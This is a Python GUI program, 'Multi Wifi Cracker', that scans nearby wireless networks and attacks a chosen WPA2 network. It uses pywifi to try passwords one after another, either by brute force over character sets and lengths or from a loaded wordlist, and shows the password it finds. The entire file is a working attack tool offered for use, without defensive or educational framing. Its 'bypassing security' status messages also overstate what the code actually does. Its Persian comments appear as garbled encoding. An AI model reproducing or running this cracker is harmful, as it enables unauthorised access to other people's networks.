import pywifi
from pywifi import const
import time
import sys
import string
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from itertools import product, islice
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
import threading
import random


class HackerWiFiBruteForcer:
    def __init__(self, root):
        self.root = root
        self.root.iconbitmap('Hack_Wifi.ico')
        self.root.title("Multi Wifi Cracker")
        self.root.geometry("1000x800")
        self.root.configure(bg='#000000')


        # ØªÙ†Ø¸ÛŒÙ… ØªÙ… Ù‡Ú©Ø±ÛŒ
        self.setup_hacker_theme()

        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0] if self.wifi.interfaces() else None
        self.stop_flag = False
        self.tested = 0
        self.start_time = time.time()
        self.password_history = deque(maxlen=20)
        self.found_password = None
        self.lock = threading.Lock()
        self.current_ssid = None
        self.wordlist = []  # Ù„ÛŒØ³Øª Ú©Ù„Ù…Ø§Øª Ø¹Ø¨ÙˆØ±
        self.use_wordlist = False  # Ø¢ÛŒØ§ Ø§Ø² ÙØ§ÛŒÙ„ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…ØŸ

        # ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø³Ø±Ø¹Øª Ø§Ø² Ú©Ø¯ Ø§ØµÙ„ÛŒ
        self.MAX_WORKERS = 12
        self.BATCH_SIZE = 20
        self.CONNECT_TIMEOUT = 0.5

        self.setup_gui()
        self.start_hacker_animation()

    def setup_hacker_theme(self):
        style = ttk.Style()
        style.theme_use('clam')

        # Ø±Ù†Ú¯â€ŒÙ‡Ø§ÛŒ Ù‡Ú©Ø±ÛŒ
        style.configure('TFrame', background='#000000')
        style.configure('TLabel', background='#000000', foreground='#00ff00', font=('Consolas', 10))
        style.configure('TButton', background='#003300', foreground='#00ff00', font=('Consolas', 10),
                        borderwidth=1, focusthickness=3, focuscolor='#00ff00')
        style.configure('Treeview', background='#001100', fieldbackground='#001100',
                        foreground='#00ff00', font=('Consolas', 9))
        style.configure('Treeview.Heading', background='#002200', foreground='#00ff00',
                        font=('Consolas', 10, 'bold'))
        style.configure('TCombobox', fieldbackground='#001100', background='#002200',
                        foreground='#00ff00', font=('Consolas', 10))
        style.configure('TSpinbox', fieldbackground='#001100', background='#002200',
                        foreground='#00ff00', font=('Consolas', 10))
        style.configure('TEntry', fieldbackground='#001100', foreground='#00ff00',
                        font=('Consolas', 10), insertcolor='#00ff00')

    def setup_gui(self):
        # Ù‡Ø¯Ø± Ù‡Ú©Ø±ÛŒ
        header = tk.Frame(self.root, bg='#000000', height=60)
        header.pack(fill='x', pady=(0, 10))

        title = tk.Label(header, text="Multi Wifi Cracker", font=('Courier', 18, 'bold'),
                         bg='#000000', fg='#00ff00')
        title.pack(pady=15)

        subtitle = tk.Label(header, text="Advanced Wireless Security Penetration Tool",
                            font=('Courier', 10), bg='#000000', fg='#00cc00')
        subtitle.pack()

        # Ù†ÙˆØªâ€ŒØ¨ÙˆÚ© Ø§ØµÙ„ÛŒ
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=15, pady=5)

        # ØªØ¨ Ø§Ø³Ú©Ù†
        scan_frame = ttk.Frame(notebook)
        notebook.add(scan_frame, text="ğŸ“¡ NETWORK SCAN")
        self.setup_scan_tab(scan_frame)

        # ØªØ¨ Ø­Ù…Ù„Ù‡
        attack_frame = ttk.Frame(notebook)
        notebook.add(attack_frame, text="âš¡ BRUTE FORCE")
        self.setup_attack_tab(attack_frame)

        # ØªØ¨ Ù†ØªØ§ÛŒØ¬
        result_frame = ttk.Frame(notebook)
        notebook.add(result_frame, text="ğŸ“Š RESULTS")
        self.setup_result_tab(result_frame)

        # ÙˆØ¶Ø¹ÛŒØª
        self.status_var = tk.StringVar(value="ğŸŸ¢ SYSTEM READY")
        status_bar = tk.Label(self.root, textvariable=self.status_var, relief='sunken',
                              anchor='w', bg='#001100', fg='#00ff00', font=('Consolas', 10))
        status_bar.pack(side='bottom', fill='x', padx=15, pady=5)

        # Ø§Ù†ÛŒÙ…ÛŒØ´Ù† Ù‡Ú©Ø±ÛŒ
        self.animation_label = tk.Label(self.root, text="", bg='#000000', fg='#00ff00',
                                        font=('Courier', 8))
        self.animation_label.pack(side='bottom', fill='x')

    def setup_scan_tab(self, parent):
        frame = ttk.Frame(parent)
        frame.pack(fill='both', expand=True, padx=10, pady=10)

        # Ø¯Ú©Ù…Ù‡ Ø§Ø³Ú©Ù†
        scan_btn = tk.Button(frame, text="ğŸ›°ï¸ SCAN NETWORKS", command=self.scan_networks,
                             bg='#002200', fg='#00ff00', font=('Consolas', 12, 'bold'),
                             relief='raised', bd=2, cursor='hand2')
        scan_btn.pack(pady=15)

        # Ù„ÛŒØ³Øª Ø´Ø¨Ú©Ù‡â€ŒÙ‡Ø§
        tree_frame = tk.Frame(frame, bg='#001100')
        tree_frame.pack(fill='both', expand=True, pady=10)

        self.network_tree = ttk.Treeview(tree_frame, columns=('signal', 'security'),
                                         show='tree headings', height=12)

        self.network_tree.heading('#0', text='TARGET SSID')
        self.network_tree.heading('signal', text='SIGNAL dBm')
        self.network_tree.heading('security', text='SECURITY')

        self.network_tree.column('#0', width=250, anchor='w')
        self.network_tree.column('signal', width=80, anchor='center')
        self.network_tree.column('security', width=100, anchor='center')

        scrollbar = ttk.Scrollbar(tree_frame, orient='vertical', command=self.network_tree.yview)
        self.network_tree.configure(yscrollcommand=scrollbar.set)

        self.network_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

    def setup_attack_tab(self, parent):
        frame = ttk.Frame(parent)
        frame.pack(fill='both', expand=True, padx=10, pady=10)

        # ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø­Ù…Ù„Ù‡
        attack_frame = tk.LabelFrame(frame, text="âš™ï¸ ATTACK CONFIG", bg='#000000',
                                     fg='#00ff00', font=('Consolas', 11, 'bold'))
        attack_frame.pack(fill='x', pady=5)

        # Ù†ÙˆØ¹ Ø­Ù…Ù„Ù‡
        tk.Label(attack_frame, text="ATTACK TYPE:", bg='#000000', fg='#00ff00',
                 font=('Consolas', 10)).grid(row=0, column=0, sticky='w', padx=10, pady=5)

        self.attack_type_var = tk.StringVar(value="BRUTE_FORCE")
        attack_type_combo = ttk.Combobox(attack_frame, textvariable=self.attack_type_var, state='readonly')
        attack_type_combo['values'] = ('BRUTE_FORCE', 'DICTIONARY')
        attack_type_combo.grid(row=0, column=1, padx=10, pady=5)
        attack_type_combo.bind('<<ComboboxSelected>>', self.toggle_attack_type)

        # Ù†ÙˆØ¹ Ú©Ø§Ø±Ø§Ú©ØªØ± (Ø¨Ø±Ø§ÛŒ Ø­Ù…Ù„Ù‡ Brute Force)
        self.charset_label = tk.Label(attack_frame, text="CHAR SET:", bg='#000000', fg='#00ff00',
                                      font=('Consolas', 10))
        self.charset_label.grid(row=1, column=0, sticky='w', padx=10, pady=5)

        self.charset_var = tk.StringVar(value="NUMERIC")
        self.charset_combo = ttk.Combobox(attack_frame, textvariable=self.charset_var, state='readonly')
        self.charset_combo['values'] = (
        'NUMERIC', 'LOWER_ALPHA', 'UPPER_ALPHA', 'MIXED_ALPHA', 'ALPHA_NUMERIC', 'FULL_SET')
        self.charset_combo.grid(row=1, column=1, padx=10, pady=5)

        # Ø·ÙˆÙ„ (Ø¨Ø±Ø§ÛŒ Ø­Ù…Ù„Ù‡ Brute Force)
        self.length_label = tk.Label(attack_frame, text="LENGTH:", bg='#000000', fg='#00ff00',
                                     font=('Consolas', 10))
        self.length_label.grid(row=2, column=0, sticky='w', padx=10, pady=5)

        self.length_var = tk.StringVar(value="8")
        self.length_spin = ttk.Spinbox(attack_frame, from_=4, to=12, textvariable=self.length_var, width=8)
        self.length_spin.grid(row=2, column=1, padx=10, pady=5, sticky='w')

        # Ø´Ø±ÙˆØ¹ Ø§Ø² (Ø¨Ø±Ø§ÛŒ Ø­Ù…Ù„Ù‡ Brute Force)
        self.start_num_label = tk.Label(attack_frame, text="START FROM:", bg='#000000', fg='#00ff00',
                                        font=('Consolas', 10))
        self.start_num_label.grid(row=3, column=0, sticky='w', padx=10, pady=5)

        self.start_num_var = tk.StringVar()
        self.start_num_entry = tk.Entry(attack_frame, textvariable=self.start_num_var, bg='#001100',
                                        fg='#00ff00', font=('Consolas', 10), width=15)
        self.start_num_entry.grid(row=3, column=1, padx=10, pady=5, sticky='w')

        # ÙˆØ¶Ø¹ÛŒØª ÙØ§ÛŒÙ„ Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ
        self.wordlist_status = tk.StringVar(value="NO WORDLIST LOADED")
        self.wordlist_label = tk.Label(attack_frame, textvariable=self.wordlist_status,
                                       bg='#000000', fg='#00cc00', font=('Consolas', 9))
        self.wordlist_label.grid(row=4, column=0, columnspan=2, pady=5)

        # Ø¯Ú©Ù…Ù‡â€ŒÙ‡Ø§ÛŒ ÙØ§ÛŒÙ„
        file_frame = tk.Frame(attack_frame, bg='#000000')
        file_frame.grid(row=5, column=0, columnspan=2, pady=10)

        self.load_wordlist_btn = tk.Button(file_frame, text="ğŸ“ LOAD WORDLIST", command=self.load_wordlist,
                                           bg='#002200', fg='#00ff00', font=('Consolas', 9))
        self.load_wordlist_btn.pack(side='left', padx=5)

        # ØªØ®Ù…ÛŒÙ†
        estimate_frame = tk.LabelFrame(frame, text="ğŸ“ˆ TIME ESTIMATION", bg='#000000',
                                       fg='#00ff00', font=('Consolas', 11, 'bold'))
        estimate_frame.pack(fill='x', pady=5)

        self.estimate_text = tk.Text(estimate_frame, height=4, bg='#001100', fg='#00ff00',
                                     font=('Consolas', 9), relief='flat')
        self.estimate_text.pack(fill='x', padx=10, pady=5)
        self.estimate_text.insert('1.0', "SELECT PARAMETERS TO ESTIMATE...")
        self.estimate_text.config(state='disabled')

        # Ø¯Ú©Ù…Ù‡â€ŒÙ‡Ø§ÛŒ Ú©Ù†ØªØ±Ù„
        control_frame = tk.Frame(frame, bg='#000000')
        control_frame.pack(pady=20)

        tk.Button(control_frame, text="ğŸš€ START ATTACK", command=self.start_attack,
                  bg='#004400', fg='#00ff00', font=('Consolas', 12, 'bold'),
                  relief='raised', bd=3, cursor='hand2').pack(side='left', padx=10)

        tk.Button(control_frame, text="â¹ STOP", command=self.stop_attack,
                  bg='#440000', fg='#ff0000', font=('Consolas', 10),
                  relief='raised', bd=2).pack(side='left', padx=10)

        # bind events
        self.charset_combo.bind('<<ComboboxSelected>>', self.update_estimate)
        self.length_spin.bind('<<Increment>>', self.update_estimate)
        self.length_spin.bind('<<Decrement>>', self.update_estimate)
        self.start_num_entry.bind('<KeyRelease>', self.update_estimate)
        attack_type_combo.bind('<<ComboboxSelected>>', self.update_estimate)

    def setup_result_tab(self, parent):
        frame = ttk.Frame(parent)
        frame.pack(fill='both', expand=True, padx=10, pady=10)

        # Ø¢Ù…Ø§Ø±
        stats_frame = tk.LabelFrame(frame, text="ğŸ“Š LIVE STATS", bg='#000000',
                                    fg='#00ff00', font=('Consolas', 11, 'bold'))
        stats_frame.pack(fill='x', pady=5)

        self.stats_text = tk.Text(stats_frame, height=5, bg='#001100', fg='#00ff00',
                                  font=('Consolas', 10), relief='flat')
        self.stats_text.pack(fill='x', padx=10, pady=5)
        self.stats_text.insert('1.0', "WAITING FOR ATTACK TO START...")
        self.stats_text.config(state='disabled')

        # ØªØ§Ø±ÛŒØ®Ú†Ù‡
        history_frame = tk.LabelFrame(frame, text="ğŸ”„ LAST ATTEMPTS", bg='#000000',
                                      fg='#00ff00', font=('Consolas', 11, 'bold'))
        history_frame.pack(fill='both', expand=True, pady=5)

        self.history_text = scrolledtext.ScrolledText(history_frame, height=10,
                                                      bg='#001100', fg='#00ff00',
                                                      font=('Courier', 9), relief='flat')
        self.history_text.pack(fill='both', expand=True, padx=10, pady=5)

        # Ù†ØªÛŒØ¬Ù‡
        result_frame = tk.LabelFrame(frame, text="ğŸ¯ RESULT", bg='#000000',
                                     fg='#00ff00', font=('Consolas', 11, 'bold'))
        result_frame.pack(fill='x', pady=5)

        self.result_text = tk.Text(result_frame, height=3, bg='#001100', fg='#00ff00',
                                   font=('Consolas', 11, 'bold'), relief='flat')
        self.result_text.pack(fill='x', padx=10, pady=5)
        self.result_text.insert('1.0', ">>> AWAITING COMMAND <<<")
        self.result_text.config(state='disabled')

    def toggle_attack_type(self, event=None):
        """Ø³ÙˆÛŒÛŒÚ† Ø¨ÛŒÙ† Ø­Ø§Ù„Øª Brute Force Ùˆ Dictionary Attack"""
        if self.attack_type_var.get() == "DICTIONARY":
            # ØºÛŒØ±ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Ú©Ù†ØªØ±Ù„â€ŒÙ‡Ø§ÛŒ Brute Force
            self.charset_label.config(state='disabled')
            self.charset_combo.config(state='disabled')
            self.length_label.config(state='disabled')
            self.length_spin.config(state='disabled')
            self.start_num_label.config(state='disabled')
            self.start_num_entry.config(state='disabled')

            # ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Ø¯Ú©Ù…Ù‡ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ
            self.load_wordlist_btn.config(state='normal')

            # Ø¢Ù¾Ø¯ÛŒØª ØªØ®Ù…ÛŒÙ† Ø²Ù…Ø§Ù†
            self.update_estimate()
        else:
            # ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Ú©Ù†ØªØ±Ù„â€ŒÙ‡Ø§ÛŒ Brute Force
            self.charset_label.config(state='normal')
            self.charset_combo.config(state='normal')
            self.length_label.config(state='normal')
            self.length_spin.config(state='normal')
            self.start_num_label.config(state='normal')
            self.start_num_entry.config(state='normal')

            # Ø¢Ù¾Ø¯ÛŒØª ØªØ®Ù…ÛŒÙ† Ø²Ù…Ø§Ù†
            self.update_estimate()

    def start_hacker_animation(self):
        def update_animation():
            animations = [
                ">>> CONNECTING TO TARGET NETWORK <<<",
                ">>> BYPASSING SECURITY PROTOCOLS <<<",
                ">>> INITIATING BRUTE FORCE SEQUENCE <<<",
                ">>> ANALYZING NETWORK TRAFFIC <<<",
                ">>> CRACKING WPA2 ENCRYPTION <<<"
            ]
            self.animation_label.config(text=random.choice(animations))
            self.root.after(2000, update_animation)

        update_animation()

    def load_wordlist(self):
        file_path = filedialog.askopenfilename(
            title="SELECT WORDLIST FILE",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.wordlist = [line.strip() for line in f if line.strip()]
                self.wordlist_status.set(f"âœ“ LOADED {len(self.wordlist)} PASSWORDS")
                messagebox.showinfo("SUCCESS", f"âœ“ LOADED {len(self.wordlist)} PASSWORDS")
                self.update_estimate()
            except Exception as e:
                messagebox.showerror("ERROR", f"LOAD FAILED: {e}")

    def scan_networks(self):
        def scan_thread():
            self.status_var.set("ğŸ” SCANNING NETWORKS...")
            self.network_tree.delete(*self.network_tree.get_children())

            try:
                self.iface.scan()
                time.sleep(3)
                networks = self.iface.scan_results()

                for net in networks:
                    security = "WPA2" if const.AKM_TYPE_WPA2PSK in net.akm else "OPEN"
                    self.network_tree.insert('', 'end', text=net.ssid,
                                             values=(net.signal, security))

                self.status_var.set(f"âœ“ FOUND {len(networks)} NETWORKS")
            except Exception as e:
                self.status_var.set("âœ— SCAN FAILED")

        threading.Thread(target=scan_thread, daemon=True).start()

    def update_estimate(self, event=None):
        try:
            if self.attack_type_var.get() == "DICTIONARY":
                if not self.wordlist:
                    estimate_text = "PLEASE LOAD A WORDLIST FIRST"
                else:
                    total_passwords = len(self.wordlist)
                    estimate_text = f"ğŸ“Š TOTAL PASSWORDS: {total_passwords:,}\n"

                    # ØªØ®Ù…ÛŒÙ† Ø³Ø±Ø¹Øª Ø¨Ø±Ø§ÛŒ Ø­Ù…Ù„Ù‡ Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ
                    speed = 15  # Ø³Ø±Ø¹Øª Ù…ØªÙˆØ³Ø· Ø¨Ø±Ø§ÛŒ Ø­Ù…Ù„Ù‡ Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ
                    estimated_time = total_passwords / speed

                    if estimated_time > 86400:
                        estimate_text += f"â° ESTIMATED TIME: {estimated_time / 86400:.1f} days"
                    elif estimated_time > 3600:
                        estimate_text += f"â° ESTIMATED TIME: {estimated_time / 3600:.1f} hours"
                    elif estimated_time > 60:
                        estimate_text += f"â° ESTIMATED TIME: {estimated_time / 60:.1f} minutes"
                    else:
                        estimate_text += f"â° ESTIMATED TIME: {estimated_time:.1f} seconds"

                    estimate_text += f"\nğŸš€ ESTIMATED SPEED: {speed} tests/second"
            else:
                charset_map = {
                    'NUMERIC': string.digits,
                    'LOWER_ALPHA': string.ascii_lowercase,
                    'UPPER_ALPHA': string.ascii_uppercase,
                    'MIXED_ALPHA': string.ascii_letters,
                    'ALPHA_NUMERIC': string.digits + string.ascii_letters,
                    'FULL_SET': string.digits + string.ascii_letters + "!@#$%^&*()"
                }

                charset = charset_map[self.charset_var.get()]
                length = int(self.length_var.get())
                start_num = self.start_num_var.get()

                total_combinations = len(charset) ** length

                if start_num and charset == string.digits and start_num.isdigit() and len(start_num) == length:
                    start_index = int(start_num)
                    remaining = total_combinations - start_index
                    estimate_text = f"ğŸ“Š REMAINING COMBINATIONS: {remaining:,}\n"
                else:
                    estimate_text = f"ğŸ“Š TOTAL COMBINATIONS: {total_combinations:,}\n"

                # ØªØ®Ù…ÛŒÙ† Ø³Ø±Ø¹Øª Ø§Ø² Ú©Ø¯ Ø§ØµÙ„ÛŒ
                charset_size = len(charset)
                if charset_size <= 10:
                    speed = 50
                elif charset_size <= 26:
                    speed = 30
                elif charset_size <= 52:
                    speed = 20
                elif charset_size <= 62:
                    speed = 15
                else:
                    speed = 10

                estimated_time = (remaining if 'remaining' in locals() else total_combinations) / speed

                if estimated_time > 86400:
                    estimate_text += f"â° ESTIMATED TIME: {estimated_time / 86400:.1f} days"
                elif estimated_time > 3600:
                    estimate_text += f"â° ESTIMATED TIME: {estimated_time / 3600:.1f} hours"
                elif estimated_time > 60:
                    estimate_text += f"â° ESTIMATED TIME: {estimated_time / 60:.1f} minutes"
                else:
                    estimate_text += f"â° ESTIMATED TIME: {estimated_time:.1f} seconds"

                estimate_text += f"\nğŸš€ ESTIMATED SPEED: {speed} tests/second"

            self.estimate_text.config(state='normal')
            self.estimate_text.delete('1.0', 'end')
            self.estimate_text.insert('1.0', estimate_text)
            self.estimate_text.config(state='disabled')

        except:
            pass

    def start_attack(self):
        if not self.network_tree.selection():
            messagebox.showwarning("WARNING", "SELECT A TARGET NETWORK FIRST!")
            return

        if self.attack_type_var.get() == "DICTIONARY" and not self.wordlist:
            messagebox.showwarning("WARNING", "PLEASE LOAD A WORDLIST FIRST!")
            return

        selected = self.network_tree.selection()[0]
        target_ssid = self.network_tree.item(selected, 'text')
        self.current_ssid = target_ssid

        self.stop_flag = False
        self.tested = 0
        self.start_time = time.time()
        self.password_history.clear()
        self.found_password = None

        self.status_var.set(f"âš¡ ATTACKING: {target_ssid}")
        self.result_text.config(state='normal')
        self.result_text.delete('1.0', 'end')
        self.result_text.insert('1.0', f">>> INITIATING ATTACK ON: {target_ssid} <<<")
        self.result_text.config(state='disabled')

        threading.Thread(target=self.run_attack, daemon=True).start()

    def run_attack(self):
        try:
            if self.attack_type_var.get() == "DICTIONARY":
                self.dictionary_attack()
            else:
                charset_map = {
                    'NUMERIC': string.digits,
                    'LOWER_ALPHA': string.ascii_lowercase,
                    'UPPER_ALPHA': string.ascii_uppercase,
                    'MIXED_ALPHA': string.ascii_letters,
                    'ALPHA_NUMERIC': string.digits + string.ascii_letters,
                    'FULL_SET': string.digits + string.ascii_letters + "!@#$%^&*()"
                }

                charset = charset_map[self.charset_var.get()]
                length = int(self.length_var.get())
                start_num = self.start_num_var.get() or None

                self.brute_force_attack(charset, length, start_num)

        except Exception as e:
            self.status_var.set("âœ— ATTACK FAILED")
            self.update_result(f"ERROR: {str(e)}")

    def dictionary_attack(self):
        """Ø­Ù…Ù„Ù‡ Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² ÙØ§ÛŒÙ„ Ù…ØªÙ†ÛŒ"""
        profile = self.create_profile(self.current_ssid)

        for i in range(0, len(self.wordlist), self.BATCH_SIZE):
            if self.stop_flag:
                break

            batch = self.wordlist[i:i + self.BATCH_SIZE]
            result = self.try_connect_batch(profile, batch)

            if result:
                self.found_password = result[0]
                break

        self.finalize_attack()

    def brute_force_attack(self, charset, length, start_num=None):
        profile = self.create_profile(self.current_ssid)
        total_combinations = len(charset) ** length

        if start_num and charset == string.digits and start_num.isdigit() and len(start_num) == length:
            # Ø´Ø±ÙˆØ¹ Ø§Ø² Ø¹Ø¯Ø¯ Ø®Ø§Øµ
            start_index = int(start_num)
            for i in range(start_index, total_combinations, self.BATCH_SIZE):
                if self.stop_flag:
                    break

                batch = [str(j).zfill(length) for j in range(i, min(i + self.BATCH_SIZE, total_combinations))]
                result = self.try_connect_batch(profile, batch)

                if result:
                    self.found_password = result[0]
                    break
        else:
            # ØªÙˆÙ„ÛŒØ¯ Ø¹Ø§Ø¯ÛŒ
            for i in range(0, total_combinations, self.BATCH_SIZE):
                if self.stop_flag:
                    break

                batch = []
                for j in range(i, min(i + self.BATCH_SIZE, total_combinations)):
                    password = []
                    temp = j
                    for _ in range(length):
                        temp, idx = divmod(temp, len(charset))
                        password.append(charset[idx])
                    batch.append(''.join(reversed(password)))

                result = self.try_connect_batch(profile, batch)

                if result:
                    self.found_password = result[0]
                    break

        self.finalize_attack()

    def create_profile(self, ssid):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        return profile

    def try_connect_batch(self, profile, passwords):
        results = []
        for password in passwords:
            if self.stop_flag:
                break

            try:
                profile.key = password
                self.iface.remove_all_network_profiles()
                tmp_profile = self.iface.add_network_profile(profile)
                self.iface.connect(tmp_profile)

                time.sleep(self.CONNECT_TIMEOUT)

                if self.iface.status() == const.IFACE_CONNECTED:
                    results.append(password)
                    self.stop_flag = True
                    break

                self.update_display(password)

            except Exception:
                continue

        return results

    def update_display(self, password):
        with self.lock:
            self.tested += 1
            self.password_history.append(password)

            elapsed = time.time() - self.start_time
            speed = self.tested / elapsed if elapsed > 0 else 0

            # Ø¢Ù¾Ø¯ÛŒØª Ø¢Ù…Ø§Ø±
            stats = f"""TOTAL TESTED: {self.tested:,}
TIME ELAPSED: {elapsed:.1f}s
SPEED: {speed:.1f} p/s
LAST TRY: {password}"""

            self.stats_text.config(state='normal')
            self.stats_text.delete('1.0', 'end')
            self.stats_text.insert('1.0', stats)
            self.stats_text.config(state='disabled')

            # Ø¢Ù¾Ø¯ÛŒØª ØªØ§Ø±ÛŒØ®Ú†Ù‡
            if self.tested % 10 == 0:
                self.history_text.delete('1.0', 'end')
                for pwd in list(self.password_history)[-15:]:
                    self.history_text.insert('end', f"[{self.tested}] {pwd}\n")

            self.status_var.set(f"ğŸ”“ TESTING: {password}")

    def finalize_attack(self):
        elapsed = time.time() - self.start_time
        speed = self.tested / elapsed if elapsed > 0 else 0

        if self.found_password:
            result = f"""âœ… CRACK SUCCESSFUL!
ğŸ”‘ PASSWORD: {self.found_password}
â° TIME: {elapsed:.2f}s
ğŸ“Š TOTAL: {self.tested:,}
ğŸš€ AVG SPEED: {speed:.1f}p/s"""
            self.status_var.set("âœ… PASSWORD CRACKED!")
        else:
            result = f"""âŒ CRACK FAILED
â° TIME: {elapsed:.2f}s
ğŸ“Š TOTAL: {self.tested:,}
ğŸš€ AVG SPEED: {speed:.1f}p/s"""
            self.status_var.set("âŒ CRACK FAILED")

        self.update_result(result)

    def update_result(self, text):
        self.result_text.config(state='normal')
        self.result_text.delete('1.0', 'end')
        self.result_text.insert('1.0', text)
        self.result_text.config(state='disabled')

    def stop_attack(self):
        self.stop_flag = True
        self.status_var.set("â¹ ATTACK STOPPED")

    def clear_results(self):
        self.stats_text.config(state='normal')
        self.stats_text.delete('1.0', 'end')
        self.stats_text.config(state='disabled')

        self.history_text.delete('1.0', 'end')

        self.result_text.config(state='normal')
        self.result_text.delete('1.0', 'end')
        self.result_text.insert('1.0', ">>> SYSTEM RESET <<<")
        self.result_text.config(state='disabled')


def main():
    root = tk.Tk()
    app = HackerWiFiBruteForcer(root)
    root.mainloop()


if __name__ == "__main__":
    main()
